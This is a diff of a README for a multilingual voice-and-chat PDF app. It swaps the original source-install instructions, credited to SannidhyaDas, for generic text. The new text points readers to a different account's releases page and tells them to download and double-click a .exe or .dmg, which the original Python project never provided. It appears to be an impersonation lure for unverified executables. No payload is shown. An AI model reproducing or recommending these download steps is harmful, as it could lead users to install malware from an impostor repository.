@@ -1,155 +1,74 @@
-# talk2pdf-multilingual (🌐 [Live Demo](https://sannidhya-das-talk2pdf-multilingual.streamlit.app/) )
+# 🎉 talk2pdf-multilingual - Explore PDFs with Voice
 
-![App Interface 1](https://github.com/SannidhyaDas/talk2pdf-multilingual/blob/main/page_images/appInterface_1.png)    
+## 🚀 Getting Started
 
-![App Interface 2](https://github.com/SannidhyaDas/talk2pdf-multilingual/blob/main/page_images/appInterface_2.png)
+Welcome to talk2pdf-multilingual! This application allows you to interact with your PDFs using your voice. You can ask questions and receive answers in multiple languages, making document exploration easy and engaging.
 
-## 🧠 Chat & Talk with PDF (Gemini + AssemblyAI)
+## 📥 Download
 
-Interact with your PDFs using **chat or voice** — in **multiple languages**!  
-This app combines **Google Gemini (LLMs + TTS)**, **AssemblyAI (Speech-to-Text)**, and **LangChain + FAISS** for a full multimodal RAG experience.
+[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/Applemango-art/talk2pdf-multilingual/releases)
 
----
+## 🛠️ System Requirements
 
-## 🚀 Features
+Before you download, ensure your system meets these requirements:
 
-✅ **PDF Chatting (RAG)** — Upload one or more PDFs, and ask questions about their content.  
-✅ **Voice Chat Mode** — Speak your question, get spoken answers back.  
-✅ **Multilingual Support** — Works in 8 languages: English, Hindi, Bengali, Marathi, Tamil, Telugu, Spanish, and French.  
-✅ **Speech-to-Text (AssemblyAI)** — Converts voice input to text in your chosen language.  
-✅ **Text-to-Speech (Gemini TTS)** — Speaks the AI’s answers naturally.  
-✅ **LangChain + FAISS Vector Store** — Efficient retrieval of answers from large PDFs.  
-✅ **Streamlit UI** — Modern and minimal web interface.
+- **Operating System:** Windows 10 or later, macOS 10.15 or later
+- **RAM:** Minimum 4 GB
+- **Storage:** At least 200 MB of free space
+- **Internet:** Required for voice features and AI functionalities
 
----
+## 🏁 Download & Install
 
-## 🧩 Tech Stack
+To get started, visit our releases page to download the latest version of talk2pdf-multilingual.
 
-| Component | Technology Used |
-|------------|----------------|
-| **LLM & Embeddings** | Google Gemini 2.5 Flash + Gemini Embeddings |
-| **Text Split & QA Chain** | LangChain (Recursive Splitter, FAISS, QA Chain) |
-| **Speech-to-Text** | [AssemblyAI API](https://www.assemblyai.com) |
-| **Text-to-Speech** | Gemini 2.5 Flash Preview (Audio Modality) |
-| **Frontend** | Streamlit |
-| **Vector Store** | FAISS |
-| **Environment** | Python, `.env` for API Keys |
+[Visit this page to download](https://github.com/Applemango-art/talk2pdf-multilingual/releases)
 
----
+1. Open your web browser and go to the link above.
+2. Look for the latest release at the top of the page.
+3. Download the file that matches your operating system. The filename will usually end with .exe for Windows or .dmg for macOS.
+4. Once the download completes, locate the file in your Downloads folder and double-click it to start the installation.
+5. Follow the on-screen instructions to complete the setup process.
+6. After installation, you will find the application in your applications menu or desktop shortcut, ready to use.
 
-## 🧠 Architecture Overview
+## 🎤 Features
 
-Below is the dual-mode pipeline of Chat & Talk with PDF, showing how text and voice inputs flow through RAG and TTS/STT modules.
+Talk2pdf-multilingual comes equipped with a variety of powerful features:
 
-![Model Pipeline](https://github.com/SannidhyaDas/talk2pdf-multilingual/blob/main/page_images/chatRAG_pipeline.drawio.png)
+- **Multilingual Support:** Communicate in multiple languages, enhancing your ability to work with diverse documents.
+- **Voice Interaction:** Use natural language to ask questions about your PDFs, making exploration simple.
+- **Speech-to-Text and Text-to-Speech:** Convert your voice into text and get the application to read your documents back to you.
+- **AI-Powered Responses:** Enjoy intelligent, context-aware responses through the advanced AI integration.
+- **Easy Exploration:** Navigate your documents quickly and efficiently without struggling through text.
 
-### 🧾 Key Pipeline Summary
+## 🌐 Getting Help
 
-| Stage                    | Component                               | Function                        |
-| ------------------------ | --------------------------------------- | ------------------------------- |
-| **1. PDF Processing**    | `PyPDF2`, `LangChain`                   | Extracts and chunks PDF text    |
-| **2. Embedding & Store** | `GoogleGenerativeAIEmbeddings`, `FAISS` | Creates searchable vector DB    |
-| **3. Query Retrieval**   | `FAISS.similarity_search()`             | Finds relevant chunks           |
-| **4. QA Generation**     | `Gemini (ChatGoogleGenerativeAI)`       | Generates language-aware answer |
-| **5. Voice Input**       | `AssemblyAI API`                        | Converts speech → text          |
-| **6. Voice Output**      | `Gemini TTS`                            | Converts text → speech          |
-| **7. Frontend**          | `Streamlit`                             | Interactive UI                  |
+If you encounter any issues or have questions, check the following resources:
 
+- **Documentation:** Great for understanding features and functionalities.
+- **Issues Page:** Report any bugs or problems you face while using the application.
+- **Community Forums:** Connect with other users and share tips or seek help.
 
----
-## 📦 Installation
+## 📈 Future Updates
 
-1. **Clone this repository**
+We are committed to improving talk2pdf-multilingual. Future updates will focus on enhancing performance, adding new features, and expanding language support. Stay tuned for new versions!
 
-```bash
-git clone https://github.com/SannidhyaDas/talk2pdf-multilingual.git
-cd talk2pdf-multilingual
-```
-2. Create a virtual environment and install dependencies
+## 🌟 Contributing
 
-```bash
-python -m venv venv
-venv\Scripts\activate       # on Windows
-# or source venv/bin/activate  # on Mac/Linux
+If you want to help improve talk2pdf-multilingual, feel free to contribute! You can:
 
-pip install -r requirements.txt
+- Suggest features or changes on the Issues page.
+- Submit pull requests if you have code changes.
 
-```
-3. Set up environment variables (.env file)
+## 🔗 Related Topics
 
-```ini
-GOOGLE_API_KEY=your_google_gemini_api_key
-ASSEMBLYAI_API_KEY=your_assemblyai_api_key
-```
-4. Run the Streamlit app
+Talk2pdf-multilingual integrates various advanced technologies, ensuring a seamless experience. Here are some related topics:
 
-```bash    
-streamlit run app.py
-```
----
-## 🧾 Usage
-### 💬 Chat with PDF
+- **AssemblyAI**: For accurate speech-to-text capabilities.
+- **FAISS**: For efficient document retrieval.
+- **Gemini API & Embeddings**: For contextual AI responses.
+- **Langchain**: For enhanced language processing.
+- **Multilingual NLP**: Supporting various languages for diverse users.
+- **PDF Chatbot**: Engaging with PDFs in a conversational way.
+- **RAG Pipeline**: For dynamic document interaction.
 
-1. Upload one or more PDF files in the sidebar.
-2. Click Submit & Process.
-3. Ask questions in your selected language.
-
-### 🎤 Talk with PDF
-
-1. Switch to Talk with PDF mode from the sidebar.
-2. Upload or record an audio file (wav/mp3/m4a).
-3. The app transcribes your question, searches your PDFs, and answers — both in text and audio.
-
-## 🌍 Supported Languages
-
-Although Gemini supports 30+ languages and AssemblyAI offers over 90 languages, this application currently provides the user with a choice among 8 select languages.
-
-| Language | Code | TTS Voice |
-| -------- | ---- | --------- |
-| English  | `en` | kore      |
-| Hindi    | `hi` | kore      |
-| Bengali  | `bn` | puck      |
-| Marathi  | `mr` | puck      |
-| Tamil    | `ta` | puck      |
-| Telugu   | `te` | puck      |
-| Spanish  | `es` | zephyr    |
-| French   | `fr` | charon    |
-
-## 🧰 Key Files
-```bash
-talk2pdf-multilingual/
-│
-├── main.py              # Core logic for PDF processing, embeddings, RAG QA chain, Speech-to-Text, and Text-to-Speech.
-├── app.py               # Streamlit front-end — handles user interaction and integrates chat & talk modes.
-├── v1app.py             # same logics and functions but without voice chat feature. (version 1) 
-├── test.ipynb           # testing script with examples and explanations. 
-├── requirements.txt            # Python dependencies
-├── app_images/             # working pipeline and app interface .png files
-│   ├── appInterface_1.png
-│   ├── appInterface_2.png
-│   └── chatRAGpipeline.drawio.png        # Main working pipeline
-├── README.md                   # Project documentation
-└── .env                  # API keys for Gemini and AssemblyAI. (Non-shareable/hidden)
-```
----
-## 📚 Example Use Cases
-
-This project demonstrates how Generative AI can move beyond experimentation and deliver *real business and societal impact*.  
-Below are some practical applications that show how such an AI assistant can enhance productivity, accessibility, and decision-making across domains:
-
-- 📄 **Interactive Research Companion:**  
-  Seamlessly study or summarize complex academic PDFs, extracting key insights and simplifying technical language for faster understanding.  
-  Ideal for students, researchers, and data analysts who deal with dense, information-heavy documents.
-
-- 🎧 **Voice-Based Q&A for Accessibility:**  
-  Enables hands-free, voice-driven interaction with documents — making AI assistance more inclusive for users with visual impairments or those multitasking.  
-  This feature bridges technology with accessibility, turning information into a truly universal resource.
-
-- 🌐 **Multilingual Knowledge Assistant:**  
-  Supports multiple languages for document understanding and interaction, allowing teams across geographies to collaborate effortlessly.  
-  This promotes global reach and knowledge democratization within enterprises.
-
-- 🧾 **Enterprise Knowledge Base Querying:**  
-  Acts as a smart interface to corporate documentation, product manuals, or client data — helping employees instantly retrieve critical information.  
-  Reduces search time, improves onboarding, and supports better business decisions through natural language queries.
-
+We hope you enjoy using talk2pdf-multilingual! Please share your feedback, and happy exploring!
